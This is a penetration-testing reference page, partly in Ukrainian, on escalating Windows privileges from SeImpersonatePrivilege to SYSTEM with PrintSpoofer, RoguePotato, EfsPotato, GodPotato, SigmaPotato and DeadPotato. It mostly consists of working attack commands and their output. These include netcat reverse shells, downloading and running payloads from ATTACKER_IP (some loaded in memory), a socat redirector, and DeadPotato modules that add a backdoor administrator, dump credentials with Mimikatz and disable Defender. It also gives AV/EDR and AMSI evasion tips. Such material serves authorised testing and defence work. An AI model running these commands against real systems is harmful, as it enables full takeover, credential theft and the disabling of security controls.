# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> Сучасна альтернатива, що часто підтримується у 2024–2025 роках — SigmaPotato (fork of GodPotato), яка додає використання in-memory/.NET reflection та розширену підтримку ОС. Див. швидке використання нижче та репозиторій у References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements and common gotchas

All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
Операційні нотатки:

- Якщо ваша оболонка працює під обмеженим токеном без SeImpersonatePrivilege (поширено для Local Service/Network Service в деяких контекстах), відновіть стандартні привілеї облікового запису за допомогою FullPowers, а потім запустіть Potato. Приклад: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer потребує, щоб сервіс Print Spooler був запущений і доступний через локальний RPC endpoint (spoolss). У жорстко захищених середовищах, де Spooler вимкнено після PrintNightmare, віддавайте перевагу RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato вимагає доступного OXID resolver по TCP/135. Якщо egress заблоковано, використовуйте redirector/port-forwarder (див. приклад нижче). У старіших збірках потрібен був прапорець -f.
- EfsPotato/SharpEfsPotato зловживають MS-EFSR; якщо один pipe заблоковано, спробуйте альтернативні pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Помилка 0x6d3 під час RpcBindingSetAuthInfo зазвичай вказує на невідому/непідтримувану RPC authentication service; спробуйте інший pipe/transport або переконайтеся, що цільовий сервіс запущено.
- «Kitchen-sink» forks, такі як DeadPotato, включають додаткові payload-модулі (Mimikatz/SharpHound/Defender off), які торкаються диска; очікуйте вищої детекції EDR порівняно з компактними оригіналами.

## Швидка демонстрація

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Примітки:
- Ви можете використовувати -i, щоб створити інтерактивний процес у поточній консолі, або -c, щоб виконати однорядкову команду.
- Потребує служби Spooler. Якщо вона відключена, це не вдасться.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Якщо outbound 135 заблоковано, pivot OXID resolver через socat на вашому redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato — новіший примітив зловживання COM, випущений наприкінці 2022 року, який націлюється на сервіс **PrintNotify** замість Spooler/BITS. Бінарний файл створює екземпляр PrintNotify COM-сервера, підставляє фейковий `IUnknown`, а потім викликає привілейований зворотний виклик через `CreatePointerMoniker`. Коли сервіс PrintNotify (що працює під **SYSTEM**) підключається назад, процес дублює повернений токен і запускає переданий payload з повними привілеями.

Ключові операційні зауваження:

* Працює на Windows 10/11 і Windows Server 2012–2022 за умови встановленого Print Workflow/PrintNotify service (він присутній навіть коли спадковий Spooler відключений після PrintNightmare).
* Потребує, щоб контекст виклику мав **SeImpersonatePrivilege** (типово для IIS APPPOOL, MSSQL і облікових записів служб запланованих задач).
* Підтримує або прямий виконуваний командний рядок, або інтерактивний режим, щоб залишатися в оригінальній консолі. Приклад:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Оскільки він повністю COM-based, не потрібні ні named-pipe listeners, ні зовнішні redirectors, що робить його прямою заміною на хостах, де Defender блокує RoguePotato’s RPC binding.

Оператори, такі як Ink Dragon, запускають PrintNotifyPotato одразу після отримання ViewState RCE на SharePoint, щоб переправитися з процесу робітника `w3wp.exe` на SYSTEM перед встановленням ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Порада: якщо один pipe не працює або EDR його блокує, спробуйте інші підтримувані pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Примітки:
- Працює на Windows 8/8.1–11 та Server 2012–2022 за наявності SeImpersonatePrivilege.
- Візьміть двійковий файл, який відповідає встановленому runtime (наприклад, `GodPotato-NET4.exe` на сучасному Server 2022).
- Якщо ваш початковий execution primitive — webshell/UI з короткими таймаутами, stage payload як скрипт і попросіть GodPotato виконати його замість довгої inline command.

Швидкий патерн staging з доступного для запису IIS webroot:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato надає два варіанти, які націлені на service DCOM об'єкти, що за замовчуванням використовують RPC_C_IMP_LEVEL_IMPERSONATE. Скомпілюйте або використайте надані бінарні файли та запустіть вашу команду:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (оновлений GodPotato fork)

SigmaPotato додає сучасні зручності, такі як in-memory execution via .NET reflection та PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Вбудований прапорець reverse shell `--revshell` та зняття 1024-символьного обмеження PowerShell, щоб ви могли запускати довгі AMSI-bypassing payloads за один раз.
- Reflection-friendly синтаксис (`[SigmaPotato]::Main()`), а також примітивний трюк обходу AV через `VirtualAllocExNuma()` для збивання з пантелику простих евристик.
- Окремий `SigmaPotatoCore.exe`, скомпільований проти .NET 2.0 для середовищ PowerShell Core.

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato зберігає GodPotato OXID/DCOM impersonation chain, але вбудовує post-exploitation helpers, щоб оператори могли негайно take SYSTEM і виконувати persistence/collection без додаткових інструментів.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — запустити довільну команду від імені SYSTEM.
- `-rev <ip:port>` — швидкий reverse shell.
- `-newadmin user:pass` — створити локального адміністратора для persistence.
- `-mimi sam|lsa|all` — скинути та запустити Mimikatz для dump credentials (записує на диск, дуже шумно).
- `-sharphound` — запустити SharpHound collection від імені SYSTEM.
- `-defender off` — вимкнути Defender real-time protection (дуже шумно).

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Оскільки воно поставляється з додатковими binaries, очікуйте більшої кількості спрацьовувань AV/EDR; використовуйте більш компактні GodPotato/SigmaPotato, коли важлива stealth.

## Посилання

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
